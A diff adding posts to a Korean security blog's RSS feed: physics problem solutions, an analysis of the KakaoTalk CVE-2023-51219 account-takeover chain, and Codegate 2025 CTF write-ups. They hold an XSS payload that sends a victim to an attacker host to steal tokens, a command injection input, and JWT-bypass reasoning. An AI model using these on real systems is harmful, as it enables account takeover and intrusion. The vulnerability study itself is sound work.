@@ -1,1 +1,907 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel><title>nullbyte_</title><description>My Blog</description><link>https://fuwari.vercel.app/</link><language>en</language></channel></rss>
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte_</title><description>My Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Physics I Problem Solving</title><link>https://fuwari.vercel.app/posts/physics/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/physics/</guid><description> </description><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;물리 실력이 부족하다는걸 느꼈다.&lt;/p&gt;
+&lt;p&gt;보안 문제 풀이 쓰는거 처럼 푼 물리문제 정리해놓으면 기억에 남을거 같아서 시작해본다.&lt;/p&gt;
+&lt;h2&gt;Solve&lt;/h2&gt;
+&lt;h3&gt;2019 학년도 9월 모평 6번&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./2019_6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;거리는 다른데 A, B가 동시에 도착한다&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ㄱ &lt;code&gt;X&lt;/code&gt; - $v_b &amp;gt; v_a$ 이고 $t$는 일정하므로 $\bar{v}$은 $B$가 더 크다.&lt;/li&gt;
+&lt;li&gt;ㄴ &lt;code&gt;X&lt;/code&gt; - 가속도 $a$는 $\frac{\Delta v}{t}$ 이므로 $B$가 $A$보다 크다.&lt;/li&gt;
+&lt;li&gt;ㄷ &lt;code&gt;O&lt;/code&gt; - 역학적 에너지 감소량은 아래와 같이 계산할 수 있다.&lt;br /&gt;
+$-mgh$는 $A$, $B$가 모두 같다.&lt;br /&gt;
+$E_k$를 계산하면
+&lt;ul&gt;
+&lt;li&gt;$E_ka = \frac{1}{2}m(v_a)^2$&lt;/li&gt;
+&lt;li&gt;$E_kb = \frac{1}{2}m(v_b)^2$&lt;/li&gt;
+&lt;li&gt;$v_b &amp;gt; v_a$ 이므로 $E_kb &amp;gt; E_ka$ 따라서 A가 역학적 에너지를 더 많이 잃었다&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;2019 학년도 9월 모평 14번&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./2019_14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;가속도가 $10m/s^2$ 으로 같다 $A, B$의 $a$, $s$, $v_i$가 주어지므로 $t$와 $v_f$를 구해낼 수 있다.&lt;/p&gt;
+&lt;p&gt;ㄱ &lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A의 초기 속력은 $20m/s$, B의 초기 속력은 $10m/s$이다.&lt;br /&gt;
+이 둘은 중력가속도 $10m/s^2$을 받아 $2$초 후에 충돌한다.&lt;br /&gt;
+즉 A의 나중 속력은 $40m/s$, B의 나중 속력은 $30m/s$이다.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;ㄴ &lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;운동량은 $P=mv$로 구할 수 있다&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$P_{A,i} = 20 \cdot 1 = 20$, $P_{A,f} = 40 \cdot 1 = 40$&lt;/li&gt;
+&lt;li&gt;$P_{B,i} = 10 \cdot 1 = 10$, $P_{B,f} = 30 \cdot 1 = 30$&lt;/li&gt;
+&lt;li&gt;$\Delta P$는 $20kg \cdot m/s$로 같다.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;ㄷ &lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$v_{A,i} = 20m/s$, $v_{A, f} = 40m/s$ 이므로 $\bar{v_A}$는 $30m/s$가 된다.&lt;br /&gt;
+$\bar{v_A} \cdot t = 30 \cdot 2 = 60 = s$&lt;br /&gt;
+$m \cdot g \cdot s = 1 \cdot 10 \cdot 60 = 600$&lt;br /&gt;
+충돌할 때 까지 2초가 걸렸으므로 A가 2초 동안 이동한 거리에 mg를 곱하면 $E_k$의 감소량을 구할 수 있다.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;답: 5&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;오투 대수능 대비 특별자료 실전 예상 모의고사 3회 5번&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./o2_3_5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;인텐은 역학적 에너지로 푸는거 같은데 그냥 &lt;code&gt;v-t&lt;/code&gt; 그려서 풀었다&lt;/p&gt;
+&lt;p&gt;A의 속력을 $v_A$, 시간을 $t_1$&lt;br /&gt;
+B의 속력을 $v_B$, 시간을 $t_2$ 라고 정의할 때 거리가지고 계산해보면 각각 도달한 시간을 구할 수 있다.
+$A$는 $\frac{5}{2} t_1$, $B$는 $3t_2$ 걸려서 도착한다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;문제에서 $4L$까지 운동하는데 걸린 시간이 같다고 명시되어 있으므로&lt;br /&gt;
+$\frac{5}{2} t_1 = 3t_2$&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;같은거리 $L$을 이동할 때를 가지고 식을 세우면&lt;br /&gt;
+$v_A \cdot t_1 = v_B \cdot t_2$&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;두 물체의 질량이 같고 이동한 거리가 같으므로&lt;br /&gt;
+$\frac{W_A}{W_B} = \frac{F_A}{F_B} = \frac{a_A}{a_B}$&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;세 식을 모두 정리하면 $\frac{25}{36}$이 나온다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;2022 학년도 9월 모평 20번&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./2022_9_20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;간단하게 마찰구간 빼고 역학적 에너지 보존으로 풀어주면 된다.&lt;/p&gt;
+&lt;p&gt;$E_{A,i} + E_{B,i} - E_{\text{손실}} = E_{A,f} + E_{B,f}$&lt;br /&gt;
+$3m \cdot g \cdot h_A + 2m \cdot g \cdot h_B - \frac{3}{4}h\cdot 3m \cdot g = \frac{h}{4} \cdot 3m \cdot g + 4h \cdot 2m \cdot g$&lt;/p&gt;
+&lt;p&gt;정리하면 아래와 같은 식을 구해낼 수 있다&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$3h_A + 2h_B = 11h$&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;문제에서 B의 속력은 충돌 후가 충돌 전의 2배라고 한다
+이를 이용해 식을 더 도출해낼 수 있다&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$4h \cdot 2m \cdot g = \frac{1}{2} \cdot 2m \cdot (2v_B)^2$&lt;/li&gt;
+&lt;li&gt;$2m \cdot g \cdot h_B = \frac{1}{2} \cdot 2m \cdot (v_B) ^2$&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;정리하면&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$v_B^2 = 2gh$&lt;/li&gt;
+&lt;li&gt;$v_B^2 = 2gh_B$&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$h=h_B$&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;따라서 $h_A = 3h_B$가 되어 답은 $\frac{1}{3}$이다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;2021 학년도 10월 학평 20번&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./2021_10_20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;그림이랑 물체 동작 이해하는게 좀 어려웠다.&lt;/p&gt;
+&lt;p&gt;기준면을 (가)의 물체 윗부분으로 보고 시작한다&lt;/p&gt;
+&lt;p&gt;$E_pA = 6mgd, E_pB = 6mgd$ 이다.&lt;br /&gt;
+$E_{\text{탄성}} = 3E_pA = 18mgd (=\frac{1}{2} \cdot k \cdot (6d)^2)$&lt;/p&gt;
+&lt;p&gt;역학적 에너지 $E$는 $30mgd$이고 $A$와 $B$의 질량이 같으므로 각각 $15mgd$씩 나눠 가진다&lt;br /&gt;
+$E_A = 15mgd, E_B = 15mgd$&lt;/p&gt;
+&lt;p&gt;또, $\frac{1}{2}k \cdot (6d)^2 = 18mgd$&lt;br /&gt;
+$kd=mg$임을 도출해낸다.&lt;br /&gt;
+$E_A = A의 E_{\text{탄성p}} + E_{\text{중력p}} + E_k$이다.&lt;/p&gt;
+&lt;p&gt;(나) 그림을 봤을 때 A는 기준면 보다 d만큼 더 내려가 있으므로
+$E_{\text{중력p}} = -mgd$&lt;/p&gt;
+&lt;p&gt;$15mgd = \frac{1}{2}mgd - mgd + E_k$&lt;/p&gt;
+&lt;p&gt;따라서 $E_k = \frac{31}{2}mgd$&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;2024 학년도 수능 20번&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./2024_scat_20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;세 과정이 필요하다&lt;/p&gt;
+&lt;h4&gt;1. 충격량 이용&lt;/h4&gt;
+&lt;p&gt;충돌 전 A의 속력을 $v$, 충돌 후 $A, B$의 속력을 각각 $v_A, v_B$라고 하자&lt;/p&gt;
+&lt;p&gt;$mv = -mv_A + 2mv_B$ 라는 식이 나온다.&lt;br /&gt;
+정리하면 $v=-v_A + 2v_B$&lt;/p&gt;
+&lt;h4&gt;2. 운동에너지 보존&lt;/h4&gt;
+&lt;p&gt;$\frac{1}{2}mv^2 = \frac{1}{2}mv_A^2 + \frac{1}{2} \cdot 2mv_B^2$&lt;br /&gt;
+$v^2 = v_A^2 + 2v_B^2$&lt;/p&gt;
+&lt;p&gt;첫번째 식을 두 번째 식에 대입하면&lt;br /&gt;
+$v_B(v_B - 2v_A) = 0$&lt;br /&gt;
+$v_B \ne 0$이므로 $v_B = 2v_A$&lt;/p&gt;
+&lt;p&gt;$v$에 대해 표현하면
+$v_A = \frac{1}{3}v, v_B = \frac{2}{3}v$&lt;/p&gt;
+&lt;h4&gt;3. 역학적 에너지 보존&lt;/h4&gt;
+&lt;p&gt;w는 마찰구간에서 손실 되는 에너지&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$9mgh - w = \frac{1}{2}mv^2$&lt;/li&gt;
+&lt;li&gt;$2mg \cdot \frac{7}{2}h = \frac{1}{2} \cdot 2m \cdot \frac{4}{9}v^2 - w$&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;$$
+\begin{cases}
+9mgh - w = \frac{1}{2}mv^2 \
+2mg \cdot \frac{7}{2}h  + w= \frac{1}{2} \cdot 2m \cdot \frac{4}{9}v^2
+\end{cases}
+$$&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$w=\frac{9}{17}mgh$&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;$\frac{1}{2}mv_A^2 - w = mgH$&lt;br /&gt;
+$= \frac{1}{2}m \cdot \frac{v^2}{9} - \frac{9}{17}mgh = mgH$&lt;/p&gt;
+&lt;p&gt;연립방정식의 첫번째 식에서   $9mgh - w = \frac{1}{2}mv^2$가 등장하므로&lt;br /&gt;
+구한 w를 사용해 변형하면
+$\frac{1}{2}mv^2 = 16mgh \cdot \frac{9}{17}$&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;ol&gt;
+&lt;li&gt;$\frac{1}{2}m \cdot \frac{v^2}{9} - \frac{9}{17}mgh = mgH$&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ol&gt;
+&lt;li&gt;$(16mgh \cdot \frac{9}{17}m) \cdot \frac{1}{9} - \frac{9}{17}mgh = mgH$&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ol&gt;
+&lt;li&gt;$H = \frac{7}{17}h$&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;답: 3&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>CVE-2023-51219 Kakaotalk One Click Exploit</title><link>https://fuwari.vercel.app/posts/cve-2020-0601/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cve-2020-0601/</guid><description> </description><pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note
+https://stulle123.github.io/posts/kakaotalk-account-takeover/&lt;br /&gt;
+stulle123님의 블로그를 기반으로 합니다.
+:::&lt;/p&gt;
+&lt;p&gt;카카오 버그바운티에 자주 참여하는 사람으로써 해당 취약점 분석을 안해볼 수 없었습니다.
+&lt;code&gt;stulle123&lt;/code&gt;님의 블로그와 관련 자료를 기반으로 하여, 구버전 카톡을 분석하였습니다&lt;/p&gt;
+&lt;p&gt;공격자는 해당 취약점을 이용해 원클릭으로 상대의 카카오톡 세션을 탈취할 수 있었습니다.&lt;/p&gt;
+&lt;p&gt;공격루틴은 아래와 같습니다&lt;/p&gt;
+&lt;h3&gt;1. XSS를 통한 access token 탈취&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:&quot;&amp;gt;&amp;lt;img src=x onerror=&quot;document.location=atob(&apos;aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv&apos;);&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;카카오톡 Android 앱의 &lt;code&gt;CommerceBuyActivity&lt;/code&gt;는 딥링크를 통해 외부 웹페이지를 WebView로 로드합니다.
+공격자는 이를 이용해 위와 같은 XSS 페이로드를 작성했습니다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CommerceBuyActivity&lt;/code&gt;에서 &lt;code&gt;kakaotalk://buy/hello&lt;/code&gt;는 &lt;code&gt;https://buy.kakao.com/hello&lt;/code&gt;와 같이 해석되어 URL을 로드합니다.&lt;/p&gt;
+&lt;p&gt;이 상태에서는 buy.kakao.com에서 xss를 터트리는 것 외에는 방법이 없어보입니다.
+따라서 분석자는 &lt;code&gt;https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=&lt;/code&gt;에서 Open Redirect 취약점을 찾아 다른 xss 포인트로 옮기는 방법을 사용했습니다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;shoppinghow.kakao.com&lt;/code&gt;에서 DOM기반 XSS 취약점이 터져 해당 포인트에서 익스플로잇 했습니다.&lt;/p&gt;
+&lt;h3&gt;2. 카카오 메일 계정 탈취&lt;/h3&gt;
+&lt;p&gt;서버로 요청된 &lt;code&gt;Authorization&lt;/code&gt; 헤더에서 카카오 계정 access token이 노출됩니다&lt;/p&gt;
+&lt;p&gt;카카오 계정 토큰을 가지고 카카오 메일의 토큰을 만들었고 카카오 메일 계정을 탈취했습니다&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;비밀번호 재설정을 요청합니다&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/kakao_accounts/check_verify_type_for_find_password.json&lt;/code&gt; 패킷을 위조해 재설정 인증번호를 카카오 메일로 받습니다&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;{
+  &quot;status&quot;: 0,
+  &quot;verify_types&quot;: [
+    0
+  ],
+  &quot;suspended&quot;: false,
+  &quot;dormant&quot;: false,
+  &quot;kakaotalk&quot;: false,
+  &quot;expired&quot;: false,
+  &quot;created_at&quot;: 1700754321,
+  &quot;two_step_verification&quot;: false,
+  &quot;is_fill_in_email&quot;: false,
+  &quot;account_type&quot;: 0,
+  &quot;display_id&quot;: null
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;verify_types&lt;/code&gt;을 변경해 확인코드가 폰 대신 이메일로 전송되게 만들었다고 합니다&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;이를 통해 탈취한 이메일로 인증번호를 받아 비밀번호를 변경했습니다&lt;/p&gt;
+&lt;h3&gt;3. 카카오톡 계정 탈취&lt;/h3&gt;
+&lt;p&gt;카카오톡 로그인에는 4자리 핀코드를 입력하는 2차 인증이 기본적으로 설정 되어 있습니다.&lt;/p&gt;
+&lt;p&gt;https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize
+https://katalk.kakao.com/win32/account/register_device.json&lt;/p&gt;
+&lt;p&gt;각각 모바일, PC에서의 인증번호를 받는 HTTP API 입니다.&lt;/p&gt;
+&lt;p&gt;탈취한 access_token을 사용해 PIN 번호를 임의로 가져올 수 있었습니다.&lt;/p&gt;
+&lt;p&gt;이로써 공격자는 완전히 피해자의 카카오톡 계정을 탈취했습니다.&lt;/p&gt;
+</content:encoded></item><item><title>Codegate 2025 Pre-Quals Write-Up</title><link>https://fuwari.vercel.app/posts/codegate/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/codegate/</guid><description>Hard..</description><pubDate>Thu, 03 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Solve&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Hello Codegate (misc)&lt;/li&gt;
+&lt;li&gt;Captcha World (misc)&lt;/li&gt;
+&lt;li&gt;Encrypted flag (crypto)&lt;/li&gt;
+&lt;li&gt;initial (rev)&lt;/li&gt;
+&lt;li&gt;Ping Tester (web)&lt;/li&gt;
+&lt;li&gt;Token Rush (web)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Comment&lt;/h2&gt;
+&lt;p&gt;처음으로 코드게이트에 참여했다.&lt;br /&gt;
+5개월 전부터 코드게이트 본선 진출을 목표로 드림핵 워게임 풀이를 시작했는데 결국 고수들한테 밀려버렸다.&lt;br /&gt;
+체감상 지금까지 코드게이트 문제들중에 웹이 제일 어려웠던거 같다&lt;br /&gt;
+끝나기 4시간 전까지 스코어보드에 내 닉네임이 나오고 있었기에 기대감을 품고 있긴 했는데, 역시.. 후반에 쭉 밀려서 31등까지 떨어졌다.&lt;/p&gt;
+&lt;p&gt;하지만 풀이자가 얼마없던 Token rush를 풀었고, Masquerade도 어느 정도 접근했었기 때문에 확실히 성장한 게 느껴져서 좋았다.&lt;/p&gt;
+&lt;p&gt;몇 달 뒤 있는 CCE는 본선 가고싶다&lt;/p&gt;
+&lt;h2&gt;Write-Up&lt;/h2&gt;
+&lt;h3&gt;Hello Codegate&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./hello_codegate.png&quot; alt=&quot;&quot; /&gt;
+&lt;code&gt;codegate2025{65782695e16255e3ef8517a1bfb059f0}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Captcha World&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;./captha_world.png&quot; alt=&quot;&quot; /&gt;
+1분 안에 캡챠 10개 풀면 플래그 준다.
+알파벳 O랑 숫자 0 구별하는게 어려워서 좀 애먹었다.
+&lt;code&gt;codegate2025{052ddb9aed355bb13db11f6178c9fad4856003a7aa1e3c4c119317093f6da52895f98ba40b30034583e5859ddc568e}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Encrypted flag&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import bytes_to_long, getPrime
+from sympy import nextprime
+import gmpy2
+
+p = getPrime(512)
+q = nextprime(p)
+
+n = p * q
+e = 65537
+
+flag = &quot;codegate2025{FAKE_FLAG}&quot;
+phi = (p - 1) * (q - 1)
+
+d = gmpy2.invert(e, phi)
+
+m = bytes_to_long(flag.encode())
+c = pow(m, e, n)
+
+print(f&quot;n: {n}&quot;)
+print(f&quot;e: {e}&quot;)
+print(&quot;Encrypted flag:&quot;, c)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;RSA 암호화를 사용해 플래그를 암호화하고, n, e, encrypted flag를 주고 있다.&lt;br /&gt;
+nextprime() 함수를 사용해 p와 가까운 q를 생성하는 방식이기에 취약하지 않을까? 라는 의심이 들었고&lt;br /&gt;
+이를 바탕으로 gpt한테 복호화 코드를 짜달라 해서 돌렸다. p와 q를 찾고 플래그를 얻어낼 수 있었다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import long_to_bytes
+import gmpy2
+
+n = 54756668623799501273661800933882720939597900879404357288428999230135977601404008182853528728891571108755011292680747299434740465591780820742049958146587060456010412555357258580332452401727868163734930952912198058084689974208638547280827744839358100210581026805806202017050750775163530268755846782825700533559
+e = 65537
+c = 7728462678531582833823897705285786444161591728459008932472145620845644046450565339835113761143563943610957661838221298240392904711373063097593852621109599751303613112679036572669474191827826084312984251873831287143585154570193022386338846894677372327190250188401045072251858178782348567776180411588467032159
+
+p = gmpy2.isqrt(n)
+print(p)
+while n % p != 0:
+    p = gmpy2.next_prime(p)
+q = n // p
+print(q)
+
+phi = (p - 1) * (q - 1)
+d = pow(e, -1, phi)
+m = pow(c, d, n)
+
+print(long_to_bytes(m).decode())
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;codegate2025{Cl0se_p_q_0f_RSA_Is_Vu1n3rabIe}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Initial&lt;/h3&gt;
+&lt;p&gt;문제 바이너리를 못 찾아 자세한 풀이는 쓰지 못했다&lt;/p&gt;
+&lt;p&gt;기억하기로는 두 개의 배열이 주어지는데&lt;/p&gt;
+&lt;p&gt;두 번째 배열을 기반으로 수도코드에 나와있던 대로 역회전 후 새로운 배열을 만들어 XOR 했던 거 같다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;codegate2025{Hell0_W0r1d_R3V_^^}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Ping Tester&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;@app.route(&apos;/ping&apos;, methods=[&apos;GET&apos;])
+def ping():
+    ip = request.args.get(&apos;ip&apos;)
+    if ip:
+        result = subprocess.run(f&quot;ping -c 3 {ip}&quot;, shell=True, capture_output=True, text=True)
+        return render_template(&apos;ping.html&apos;, result=result.stdout)
+    else:
+        return render_template(&apos;ping.html&apos;, message=&quot;Please provide IP address.&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;간단한 커맨드 인젝션 문제이다
+&lt;code&gt;1.1.1.1 &amp;amp;&amp;amp; cat flag&lt;/code&gt;으로 플래그 읽어와주면 된다.&lt;/p&gt;
+&lt;p&gt;문제서버가 닫혀서 플래그는 적지 못했다.&lt;/p&gt;
+&lt;h3&gt;Token Rush&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;const express = require(&quot;express&quot;);
+const cookieParser = require(&quot;cookie-parser&quot;);
+const crypto = require(&apos;node:crypto&apos;);
+const fs = require(&quot;fs&quot;);
+const path = require(&quot;path&quot;);
+const b64Lib = require(&quot;base64-arraybuffer&quot;);
+const flag = &quot;codegate2025{FAKE_FLAG}&quot;;
+const PrivateKey = `FAKE_PRIVATE_KEY`;
+const PublicKey = `63c9b8f6cc06d91f1786aa3399120957f2f4565892a6763a266d54146e6d4af9`;
+const tokenDir = path.join(__dirname, &quot;token&quot;);
+const app = express();
+app.use(express.json());
+app.use(cookieParser());
+app.set(&quot;view engine&quot;, &quot;ejs&quot;);
+Object.freeze(Object.prototype);
+fs.promises.mkdir(tokenDir, { recursive: true });
+
+let db = {
+    admin: { uid: &quot;87c869e7295663f2c0251fc31150d0e3&quot;,
+            pw: crypto.randomBytes(32).toString(&apos;hex&apos;),
+            name: &quot;administrator&quot;
+        }
+};
+
+let temporaryFileName = path.join(tokenDir, crypto.randomBytes(32).toString(&apos;hex&apos;));
+
+const gen_hash = async () =&amp;gt; {
+    let data = &quot;&quot;;
+    for (var i = 0; i &amp;lt; 1234; i++) {
+        data += crypto.randomBytes(1234).toString(&apos;hex&apos;)[0];
+    }
+    const hash = crypto.createHash(&apos;sha256&apos;).update(data);
+    return hash.digest(&apos;hex&apos;).slice(0, 32);
+};
+
+const gen_JWT = async (alg, userId, key) =&amp;gt; {
+    const strEncoder = new TextEncoder();
+    let headerData = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ alg: alg, typ: &quot;JWT&quot; }))));
+    let payload = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ uid: userId }))));
+    if (alg == &quot;ES256&quot;) {
+        let baseKey = await crypto.subtle.importKey(&quot;pkcs8&quot;, b64Lib.decode(key), { name: &quot;ECDSA&quot;, namedCurve: &quot;P-256&quot; }, true, [&quot;sign&quot;]);
+        let sig = await crypto.subtle.sign({ name: &quot;ECDSA&quot;, hash: &quot;SHA-256&quot; }, baseKey, new TextEncoder().encode(`${headerData}.${payload}`));
+        return `${headerData}.${payload}.${urlsafe(b64Lib.encode(new Uint8Array(sig)))}`;
+    }
+};
+
+const read_JWT = async (token) =&amp;gt; {
+    const decoder = new TextDecoder();
+    let payload = token.split(&quot;.&quot;)[1];
+    return JSON.parse(decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll(&apos;\x00&apos;, &apos;&apos;));
+};
+
+const urlsafe = (base) =&amp;gt; base.replace(/\+/g, &quot;-&quot;).replace(/\//g, &quot;_&quot;).replace(/=+$/, &quot;&quot;);
+const decodeurlsafe = (dat) =&amp;gt; dat.replace(/-/g, &quot;+&quot;).replace(/_/g, &quot;/&quot;);
+
+app.post(&apos;/&apos;, () =&amp;gt; {});
+
+app.post(&quot;/sign_in&quot;, async (req, res) =&amp;gt; {
+    try {
+        const { id, pw } = req.body;
+        if (!db[id] || db[id][&quot;pw&quot;] !== pw) {
+            res.json({ message: &quot;Invalid credentials&quot; });
+            return;
+        }
+        let token = await gen_JWT(&quot;ES256&quot;, db[id][&quot;uid&quot;], PrivateKey);
+        res.cookie(&quot;check&quot;, token, { maxAge: 100 }).json({ message: &quot;Success&quot; });
+    } catch (a) {
+        res.json({ message: &quot;Failed&quot; });
+    }
+});
+
+app.post(&quot;/sign_up&quot;, async (req, res) =&amp;gt; {
+    try {
+        const { id, data } = req.body;
+        if (id.toLowerCase() === &quot;administrator&quot; || db[id]) {
+            res.json({ message: &quot;Unallowed key&quot; });
+            return;
+        }
+        db[id] = { ...data, uid: crypto.randomBytes(32).toString(&apos;hex&apos;) };
+        res.json({ message: &quot;Success&quot; });
+    } catch (a) {
+        res.json({ message: &quot;Failed&quot; });
+    }
+});
+
+app.post(&quot;/2fa&quot;, async (req, res) =&amp;gt; {
+    try {
+        const token = req.cookies.check ?? &quot;&quot;;
+        const data = await read_JWT(token, PublicKey);
+        if (db.admin.uid !== data.uid) {
+            res.json({ message: &quot;Permission denied&quot; });
+            return;
+        }
+        let rand_data = await gen_hash();
+        await fs.promises.writeFile(temporaryFileName, rand_data);
+        res.json({ message: &quot;Success&quot; });
+    } catch (a) {
+        res.json({ message: &quot;Unauthorized&quot; });
+    }
+});
+
+app.post(&quot;/auth&quot;, async (req, res) =&amp;gt; {
+    try {
+        const token = req.cookies.check ?? &quot;&quot;;
+        const data = await read_JWT(token, PublicKey);
+        if (db.admin.uid !== data.uid) {
+            res.json({ message: &quot;Permission denied&quot; });
+            return;
+        }
+        const { data: input } = req.body;
+        const storedData = await fs.promises.readFile(temporaryFileName, &quot;utf-8&quot;);
+        if (input === storedData) {
+            res.json({ flag });
+        } else {
+            res.json({ message: &quot;Token Error&quot; });
+        }
+    } catch (a) {
+        res.json({ message: &quot;Internal Error&quot; });
+    }
+});
+
+app.post(&quot;/data&quot;, (req, res) =&amp;gt; {
+    res.status(req.body.auth_key ? 200 : 400).send(req.body.auth_key ? &apos;Success&apos; : &apos;Failed&apos;);
+});
+
+app.listen(1234);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;먼저 어드민 계정을 얻어야하는데&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;let payload = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ uid: userId }))));
+return `${headerData}.${payload}.${urlsafe(b64Lib.encode(new Uint8Array(sig)))}`;
+
+...
+
+const read_JWT = async (token) =&amp;gt; {
+    const decoder = new TextDecoder();
+    let payload = token.split(&quot;.&quot;)[1];
+    return JSON.parse(decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll(&apos;\x00&apos;, &apos;&apos;));
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;read_JWT()&lt;/code&gt; 함수는 인자로 token 하나만을 받지만 위 코드에서는 두번째 인자에 PublicKey를 보낸다.
+즉, 애초에 PublicKey 검증 자체를 안한다는 것이다 (검증한다고 하더라도 PublicKey는 코드에 공개되어있다)&lt;/p&gt;
